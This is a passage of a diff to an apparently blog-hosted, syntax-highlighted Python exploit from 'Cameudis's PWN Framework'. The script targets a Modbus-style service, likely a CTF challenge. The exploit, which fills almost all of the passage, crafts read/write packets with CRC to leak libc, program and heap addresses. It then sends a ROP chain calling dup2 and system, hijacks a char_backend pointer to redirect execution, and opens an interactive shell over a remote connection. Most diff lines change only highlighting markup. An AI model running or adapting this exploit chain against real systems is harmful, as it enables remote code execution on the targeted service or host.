-<span class="k">def</span> <span class="nf">crc_bytes</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">endian</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s">'little'</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
-    <span class="k">return</span> <span class="n">calc_crc</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">endian</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">crc_bytes</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">endian</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="sh">'</span><span class="s">little</span><span class="sh">'</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+    <span class="k">return</span> <span class="nf">calc_crc</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">endian</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">big2int</span><span class="p">(</span><span class="n">n</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
-    <span class="n">num</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">n</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">*</span><span class="mh">0x100</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">n</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+    <span class="n">num</span> <span class="o">=</span> <span class="nf">ord</span><span class="p">(</span><span class="n">n</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">*</span><span class="mh">0x100</span> <span class="o">+</span> <span class="nf">ord</span><span class="p">(</span><span class="n">n</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
     <span class="k">return</span> <span class="n">num</span>
 
 <span class="k">def</span> <span class="nf">resolve_pak</span><span class="p">(</span><span class="n">p</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
-    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] pak to slave </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="si">}</span><span class="s">, func </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] pak to slave </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="si">}</span><span class="s">, func </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
     <span class="n">func</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
     <span class="k">if</span> <span class="n">func</span> <span class="o">==</span> <span class="mh">0x03</span><span class="p">:</span>
         <span class="n">big_data</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="mi">3</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
-        <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
-        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">big_data</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
-            <span class="n">data</span> <span class="o">+=</span> <span class="n">big_data</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">].</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">big_data</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">" Reading data: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">big_data</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
+            <span class="n">data</span> <span class="o">+=</span> <span class="n">big_data</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">big_data</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s"> Reading data: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
         <span class="k">return</span> <span class="n">data</span>
     <span class="k">if</span> <span class="n">func</span> <span class="o">==</span> <span class="mh">0x10</span><span class="p">:</span>
-        <span class="n">startaddr</span> <span class="o">=</span> <span class="n">big2int</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">])</span>
-        <span class="n">quantity</span> <span class="o">=</span> <span class="n">big2int</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">6</span><span class="p">])</span>
-        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">" Writing data to startaddr: </span><span class="si">{</span><span class="n">startaddr</span><span class="si">}</span><span class="s">, quantity: </span><span class="si">{</span><span class="n">quantity</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">startaddr</span> <span class="o">=</span> <span class="nf">big2int</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">])</span>
+        <span class="n">quantity</span> <span class="o">=</span> <span class="nf">big2int</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">6</span><span class="p">])</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s"> Writing data to startaddr: </span><span class="si">{</span><span class="n">startaddr</span><span class="si">}</span><span class="s">, quantity: </span><span class="si">{</span><span class="n">quantity</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
         <span class="k">return</span> <span class="n">null</span>
     <span class="k">if</span> <span class="n">func</span> <span class="o">&amp;</span> <span class="mh">0x80</span><span class="p">:</span>
         <span class="n">error1</span> <span class="o">=</span> <span class="n">func</span> <span class="o">^</span> <span class="mh">0x80</span>
         <span class="n">error2</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
-        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">" error1: </span><span class="si">{</span><span class="n">error1</span><span class="si">}</span><span class="s">, error2: </span><span class="si">{</span><span class="n">error2</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s"> error1: </span><span class="si">{</span><span class="n">error1</span><span class="si">}</span><span class="s">, error2: </span><span class="si">{</span><span class="n">error2</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
         <span class="k">return</span> <span class="n">null</span>
 
 <span class="k">def</span> <span class="nf">func03</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">quant</span><span class="p">):</span>
-    <span class="n">pak</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x01\x03</span><span class="s">'</span> <span class="o">+</span> <span class="n">addr</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">'big'</span><span class="p">)</span> <span class="o">+</span> <span class="n">quant</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">'big'</span><span class="p">)</span>
-    <span class="n">pak</span> <span class="o">+=</span> <span class="n">crc_bytes</span><span class="p">(</span><span class="n">pak</span><span class="p">)</span>
+    <span class="n">pak</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x01\x03</span><span class="sh">'</span> <span class="o">+</span> <span class="n">addr</span><span class="p">.</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sh">'</span><span class="s">big</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">quant</span><span class="p">.</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sh">'</span><span class="s">big</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">pak</span> <span class="o">+=</span> <span class="nf">crc_bytes</span><span class="p">(</span><span class="n">pak</span><span class="p">)</span>
     <span class="k">return</span> <span class="n">pak</span>
 
 <span class="k">def</span> <span class="nf">func10</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">quant</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
-    <span class="n">pak</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x01\x10</span><span class="s">'</span> <span class="o">+</span> <span class="n">addr</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">'big'</span><span class="p">)</span> <span class="o">+</span> <span class="n">quant</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">'big'</span><span class="p">)</span>
-    <span class="n">pak</span> <span class="o">+=</span> <span class="p">(</span><span class="n">quant</span><span class="o">*</span><span class="mi">2</span><span class="p">).</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">pak</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x01\x10</span><span class="sh">'</span> <span class="o">+</span> <span class="n">addr</span><span class="p">.</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sh">'</span><span class="s">big</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">quant</span><span class="p">.</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sh">'</span><span class="s">big</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">pak</span> <span class="o">+=</span> <span class="p">(</span><span class="n">quant</span><span class="o">*</span><span class="mi">2</span><span class="p">).</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
     <span class="n">pak</span> <span class="o">+=</span> <span class="n">data</span> <span class="c1"># for func03
 </span>    <span class="c1"># for i in range(quant):
 </span>        <span class="c1"># pak += data[i*2:i*2+2][::-1]
-</span>    <span class="n">pak</span> <span class="o">+=</span> <span class="n">crc_bytes</span><span class="p">(</span><span class="n">pak</span><span class="p">)</span>
+</span>    <span class="n">pak</span> <span class="o">+=</span> <span class="nf">crc_bytes</span><span class="p">(</span><span class="n">pak</span><span class="p">)</span>
     <span class="k">return</span> <span class="n">pak</span>
 
 <span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
 
     <span class="c1"># leak
 </span>
-    <span class="n">s</span><span class="p">(</span><span class="n">func03</span><span class="p">(</span><span class="mh">0xff9f</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">))</span>
+    <span class="nf">s</span><span class="p">(</span><span class="nf">func03</span><span class="p">(</span><span class="mh">0xff9f</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">))</span>
 
-    <span class="n">mes</span> <span class="o">=</span> <span class="n">r</span><span class="p">()</span>
-    <span class="n">data</span> <span class="o">=</span> <span class="n">resolve_pak</span><span class="p">(</span><span class="n">mes</span><span class="p">)</span>
+    <span class="n">mes</span> <span class="o">=</span> <span class="nf">r</span><span class="p">()</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="nf">resolve_pak</span><span class="p">(</span><span class="n">mes</span><span class="p">)</span>
 
-    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">])</span><span class="o">-</span><span class="mh">0x203b60</span>
-    <span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] libc_base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">])</span><span class="o">-</span><span class="mh">0x203b60</span>
+    <span class="nf">success</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] libc_base: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
 
-    <span class="n">prog_base</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mh">0xa8</span><span class="p">:</span><span class="mh">0xa8</span><span class="o">+</span><span class="mi">8</span><span class="p">])</span><span class="o">-</span><span class="mh">0x9ea35e</span>
-    <span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] prog_base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">prog_base</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">prog_base</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mh">0xa8</span><span class="p">:</span><span class="mh">0xa8</span><span class="o">+</span><span class="mi">8</span><span class="p">])</span><span class="o">-</span><span class="mh">0x9ea35e</span>
+    <span class="nf">success</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] prog_base: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">prog_base</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
 
-    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mh">0x10</span><span class="p">:</span><span class="mh">0x18</span><span class="p">])</span><span class="o">-</span><span class="mh">0xa4270</span>
-    <span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] heap_base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">heap_base</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mh">0x10</span><span class="p">:</span><span class="mh">0x18</span><span class="p">])</span><span class="o">-</span><span class="mh">0xa4270</span>
+    <span class="nf">success</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] heap_base: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
 
     <span class="c1"># hijack ptr in opaque
 </span>
@@ -903,40 +904,40 @@
 </span>    <span class="c1"># 0x000000000010f78b : pop rdi ; ret
 </span>    <span class="c1"># 0x0000000000110a7d : pop rsi ; ret
 </span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">([</span>
         <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xdd237</span><span class="p">,</span>
         <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2d6c50</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">,</span>
         <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2882f</span><span class="p">,</span>
         <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x10f78b</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span>
         <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x110a7d</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
-        <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"dup2"</span><span class="p">],</span>
+        <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">dup2</span><span class="sh">"</span><span class="p">],</span>
         <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x10f78b</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span>
         <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x110a7d</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>
-        <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"dup2"</span><span class="p">],</span>
+        <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">dup2</span><span class="sh">"</span><span class="p">],</span>
         <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x10f78b</span><span class="p">,</span> <span class="n">prog_base</span> <span class="o">+</span> <span class="mh">0xD8A7D7</span><span class="p">,</span>
         <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2882f</span><span class="p">,</span>
-        <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>
+        <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">]</span>
     <span class="p">])</span>
-    <span class="n">s</span><span class="p">(</span><span class="n">func10</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="o">*</span><span class="mh">0x11</span> <span class="o">+</span> <span class="n">payload</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x6c</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)))</span>
-    <span class="n">s</span><span class="p">(</span><span class="n">func03</span><span class="p">(</span><span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">))</span>
+    <span class="nf">s</span><span class="p">(</span><span class="nf">func10</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\0</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x11</span> <span class="o">+</span> <span class="n">payload</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x6c</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\0</span><span class="sh">'</span><span class="p">)))</span>
+    <span class="nf">s</span><span class="p">(</span><span class="nf">func03</span><span class="p">(</span><span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">))</span>
 
     <span class="n">hijack_rip</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x16bde0</span>
     <span class="n">hijack_rdi_rax</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2d6c50</span>
 
-    <span class="n">s</span><span class="p">(</span><span class="n">func10</span><span class="p">(</span><span class="mh">0xfff1</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">char_backend</span><span class="p">)</span><span class="o">+</span><span class="n">flat</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="n">hijack_rip</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">hijack_rdi_rax</span><span class="p">])).</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x20</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span><span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)))</span>
-    <span class="n">s</span><span class="p">(</span><span class="n">func03</span><span class="p">(</span><span class="mh">0xfa17</span><span class="p">,</span> <span class="mh">0x5f4</span><span class="p">))</span>
+    <span class="nf">s</span><span class="p">(</span><span class="nf">func10</span><span class="p">(</span><span class="mh">0xfff1</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\0</span><span class="sh">'</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">char_backend</span><span class="p">)</span><span class="o">+</span><span class="nf">flat</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="n">hijack_rip</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">hijack_rdi_rax</span><span class="p">])).</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x20</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\0</span><span class="sh">'</span><span class="p">)))</span>
+    <span class="nf">s</span><span class="p">(</span><span class="nf">func03</span><span class="p">(</span><span class="mh">0xfa17</span><span class="p">,</span> <span class="mh">0x5f4</span><span class="p">))</span>
 
-    <span class="n">r</span><span class="p">()</span>
+    <span class="nf">r</span><span class="p">()</span>
 
-    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 
 
 <span class="c1"># ------------------ Infrastructure ------------------ #
 </span>
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Cameudis's PWN Framework"</span><span class="p">)</span>
-    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
-    <span class="n">pwn</span><span class="p">()</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Cameudis</span><span class="sh">'</span><span class="s">s PWN Framework</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+    <span class="nf">pwn</span><span class="p">()</span>
 
 </code></pre></div></div>
 
@@ -955,6 +956,14 @@
       <h3 class="related-posts-title">RELATED POSTS</h3>
       <div class="related-posts-list">
         
+    
+      
+        
+        
+        
+
+        
+      
     
       
         
